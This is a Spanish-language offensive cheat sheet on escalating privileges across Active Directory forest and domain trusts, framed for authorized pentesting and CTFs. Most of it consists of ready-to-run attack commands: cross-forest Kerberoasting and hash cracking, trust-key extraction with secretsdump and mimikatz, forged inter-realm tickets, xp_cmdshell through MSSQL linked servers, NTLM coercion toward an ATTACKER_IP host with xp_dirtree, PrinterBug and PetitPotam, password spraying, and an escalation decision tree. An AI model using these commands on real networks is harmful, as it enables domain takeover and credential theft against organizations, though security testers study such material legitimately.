# Cross-Forest Trust Attacks — Escalación entre Dominios y Forests

Guía para explotar relaciones de confianza entre forests y dominios de Active Directory. Los trusts son uno de los vectores más poderosos y menos entendidos en AD — un compromiso en un forest puede llevar al compromiso del otro.

**Contexto:** Uso en pentesting autorizado de AD multi-forest, CTFs, y laboratorios de seguridad.

---

## Tipos de Trust y sus Implicaciones

| Tipo | Dirección | Scope | SID Filtering | Atacabilidad |
|------|-----------|-------|---------------|-------------|
| **Forest Trust** | Bidireccional o unidireccional | Entre forests | Habilitado por defecto | Media — SID filtering limita escalación directa |
| **External Trust** | Unidireccional | Entre dominios de forests diferentes | Habilitado | Similar a Forest Trust |
| **Parent-Child** | Bidireccional | Dentro del mismo forest | NO habilitado | Alta — SIDHistory injection funciona |
| **Shortcut Trust** | Bidireccional | Entre dominios del mismo forest | NO habilitado | Alta — misma confianza que parent-child |

### Enumeración de trusts
```bash
# Desde Linux con credenciales
bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All
# BloodHound muestra trusts en el graph

# Desde MSSQL (si tienes shell en el dominio)
# PowerShell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# nltest
nltest /domain_trusts /all_trusts

# Desde Linux con impacket
# Verificar trust attributes en AD
ldapsearch -H ldap://DC_IP -b "CN=System,DC=domain,DC=local" "(objectClass=trustedDomain)" cn trustDirection trustType trustAttributes securityIdentifier
```

### Trust Attributes que importan
- **trustDirection:** 1=Inbound, 2=Outbound, 3=Bidirectional
- **trustType:** 1=Downlevel (NT4), 2=Uplevel (AD), 3=MIT (Kerberos)
- **trustAttributes:** Bit 8 (0x8) = FOREST_TRANSITIVE, Bit 4 (0x4) = SID_FILTERING_ENABLED
- **SID Filtering ON** = no puedes inyectar SIDs arbitrarios vía SIDHistory o Golden Ticket extra SIDs

---

## SID Filtering — Qué Bloquea y Cuándo Bypasear

### Qué hace SID Filtering
Cuando un usuario de Forest A autentica en Forest B, el DC de Forest B **filtra** los SIDs en el token:
- Remueve SIDs que pertenecen a Forest B (evita escalación directa)
- Remueve SIDs well-known privilegiados (Enterprise Admins, Schema Admins, etc.)
- Solo permite SIDs que pertenecen a Forest A

### Cuándo SID Filtering está OFF
- **Parent-Child trusts** (dentro del mismo forest) → NO hay SID filtering
- **Trusts con `trustAttributes` sin bit 0x4** → filtering deshabilitado (raro pero posible)
- **Selective Authentication deshabilitada** → acceso más amplio

### Bypass cuando SID Filtering está ON
No hay bypass directo para SID filtering bien configurado. Sin embargo:
1. **Explotar el trust account (TDO)** — ver sección abajo
2. **Cross-forest Kerberoasting** — obtener hashes sin necesidad de inyectar SIDs
3. **Cross-forest MSSQL** — linked servers no dependen de SID filtering
4. **Cross-forest ADCS** — solicitar certificados del otro forest
5. **Atacar usuarios/servicios compartidos** — si un usuario existe en ambos forests con misma password

---

## Vectores de Ataque Cross-Forest

### 1. Cross-Forest Kerberoasting

Si tienes credenciales en Forest A, puedes solicitar TGS tickets para service accounts en Forest B (si el trust es bidireccional o tienes acceso outbound).

```bash
# Kerberoast cuentas del otro forest
GetUserSPNs.py 'ForestA/user:password' -target-domain forestb.local -dc-ip DC_FOREST_B_IP -request

# Si tienes DA en Forest A, puedes Kerberoast CUALQUIER cuenta con SPN en Forest B
GetUserSPNs.py 'ForestA/administrator:password' -target-domain forestb.local -dc-ip DC_FOREST_B_IP -request -outputfile cross_forest_tgs.txt

# Crackear
hashcat -m 13100 cross_forest_tgs.txt /usr/share/wordlists/rockyou.txt
```

### 2. Trust Account (TDO) Attack

Cada trust crea una cuenta especial (Trusted Domain Object) en ambos forests. Esta cuenta tiene un password que se puede extraer si eres DA en un forest.

```bash
# Como DA en Forest A, extraer el TDO password hash
secretsdump.py forestA/administrator@DC_A -just-dc-user 'FORESTB$'

# El hash del TDO puede usarse para:
# 1. Crear inter-realm TGT (si conoces el trust key)
# 2. Autenticar como el trust account en el otro forest
```

### Inter-Realm TGT con trust key
```bash
# Extraer trust key (krbtgt de la relación de trust)
# Desde mimikatz (en DC de Forest A como DA):
# lsadump::trust /patch
# O via secretsdump:
secretsdump.py forestA/administrator@DC_A

# Crear inter-realm TGT
ticketer.py -nthash TRUST_KEY_HASH -domain forestA.local -domain-sid S-1-5-21-A \
  -extra-sid S-1-5-21-B-519 -spn krbtgt/forestB.local administrator

# NOTA: Si SID filtering está ON, el extra-sid de Enterprise Admins (519) será filtrado
# Pero el TGT inter-realm permite autenticar como usuario de Forest A en Forest B
```

### 3. Cross-Forest MSSQL Linked Servers

Los linked servers MSSQL frecuentemente cruzan boundaries de forest trust. El linked server autentica con sus propias credenciales configuradas, bypaseando las restricciones normales de trust.

```sql
-- Desde MSSQL en Forest A, ejecutar en linked server de Forest B
EXEC ('SELECT @@servername, SYSTEM_USER') AT [SQLServer.ForestB.local];

-- Si eres sysadmin en el linked server
EXEC ('EXEC xp_cmdshell ''whoami /all''') AT [SQLServer.ForestB.local];

-- Coercion NTLM del service account del otro forest
EXEC ('EXEC master..xp_dirtree ''\\ATTACKER_IP\share''') AT [SQLServer.ForestB.local];
```

Este vector es especialmente poderoso porque:
- Los linked servers suelen tener credenciales privilegiadas configuradas
- El mapeo de login puede otorgar sysadmin en el otro server
- No está limitado por SID filtering (es autenticación SQL/Windows directa)

### 4. Cross-Forest ADCS

Si un forest tiene una CA y el trust permite enrollment, puedes solicitar certificados:

```bash
# Enumerar CAs accesibles del otro forest
certipy find -u 'user@forestA.local' -p 'password' -dc-ip DC_FORESTB_IP -target forestb.local

# Solicitar certificado del otro forest
certipy req -u 'user@forestA.local' -p 'password' \
  -ca 'ForestB-CA' -template 'User' -dc-ip DC_FORESTB_IP

# Si certipy no alcanza el CA desde tu máquina, usa certreq desde host comprometido:
# (en PowerShell del host en Forest B)
certreq -submit -config "CA.forestB.local\ForestB-CA" -attrib "CertificateTemplate:User" request.csr cert.cer
```

### 5. Coercion Cross-Forest (PrinterBug / PetitPotam)

Forzar al DC de un forest a autenticarse contra tu máquina o contra un host con Unconstrained Delegation en el otro forest.

```bash
# PrinterBug: forzar DC de Forest B a autenticarse contra host en Forest A
python3 printerbug.py forestA/user:password@DC_FORESTB DC_FORESTA_or_ATTACKER

# PetitPotam
python3 PetitPotam.py -u user -p password -d forestA.local ATTACKER_IP DC_FORESTB
```

**Combinación con Unconstrained Delegation:**
Si un host en Forest A tiene Unconstrained Delegation y puedes forzar al DC de Forest B a autenticarse contra él, el TGT del DC de Forest B queda cacheado en el host de Forest A. Extraer con Rubeus/mimikatz → DCSync en Forest B.

**Limitación:** Esto requiere SYSTEM en el host con Unconstrained Delegation para extraer tickets de LSASS.

### 6. Shared Credentials / Password Reuse

El vector más simple y más común. Administradores usan la misma password en ambos forests.

```bash
# Si tienes DA hash de Forest A, probar en Forest B
crackmapexec smb DC_FORESTB -u administrator -H HASH_FROM_FORESTA -d forestb.local
secretsdump.py forestb.local/administrator@DC_FORESTB -hashes ':HASH'

# Spraying de cuentas encontradas en Forest A contra Forest B
crackmapexec smb DC_FORESTB -u users_forestA.txt -p passwords_found.txt -d forestb.local
```

---

## Decision Tree: Cross-Forest Escalation

```
Tienes acceso en Forest A, quieres escalar a Forest B
    │
    ├── ¿Eres DA en Forest A?
    │   SÍ → Extraer TDO hash + trust key
    │   │   → Cross-forest Kerberoasting
    │   │   → Probar password reuse de DA en Forest B
    │   │   → Coercion de DC_B hacia host con Unconstrained Delegation en A
    │   │
    │   NO → ¿Tienes acceso a MSSQL linked server cross-forest?
    │       SÍ → Pivotar via EXEC AT → ver tools/mssql-attacks.md
    │       │
    │       NO → ¿Puedes hacer cross-forest Kerberoasting?
    │           SÍ → Solicitar TGS de service accounts en Forest B → crackear
    │           │
    │           NO → ¿Hay ADCS cross-forest?
    │               SÍ → Solicitar certificados via certipy/certreq
    │               │
    │               NO → Password spraying cross-forest con creds conocidas
    │                   → Coercion NTLM cross-forest (PrinterBug/PetitPotam)
    │                   → Buscar shares accesibles en Forest B
```

---

## Enumeración Cross-Forest desde Host Comprometido

Cuando estás en un host del Forest B (via linked server, shell, etc.):

```powershell
# Enumerar el otro forest via ADSI
$forestA = [ADSI]"LDAP://DC01.forestA.local/DC=forestA,DC=local"

# Buscar usuarios con SPNs (Kerberoastable)
$searcher = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
$searcher.SearchRoot = [ADSI]"LDAP://DC=forestA,DC=local"
$searcher.FindAll()

# Buscar grupos privilegiados
$searcher = [adsisearcher]"(&(objectClass=group)(cn=Domain Admins))"
$searcher.SearchRoot = [ADSI]"LDAP://DC=forestB,DC=local"
$searcher.FindAll()

# Listar trusts
nltest /domain_trusts /all_trusts
```

---

## Tips

- **SID Filtering no protege contra todo** — Kerberoasting, MSSQL linked servers, ADCS, y password reuse funcionan independientemente de SID filtering.
- **Trust keys rotan** — el TDO password cambia cada 30 días por defecto. Si extraes el hash, úsalo pronto.
- **Bidireccional ≠ acceso mutuo** — un trust bidireccional permite autenticación en ambas direcciones, pero los permisos dependen de las ACLs.
- **BloodHound multi-forest** — ejecuta bloodhound-python contra ambos forests y combina los datos para ver rutas cross-trust.
- **Selective Authentication** — si el trust tiene Selective Authentication habilitada, necesitas "Allowed to Authenticate" en objetos específicos del otro forest.
- **Forest trusts no son parent-child** — no asumas que técnicas intra-forest (SIDHistory injection) funcionan cross-forest con SID filtering ON.
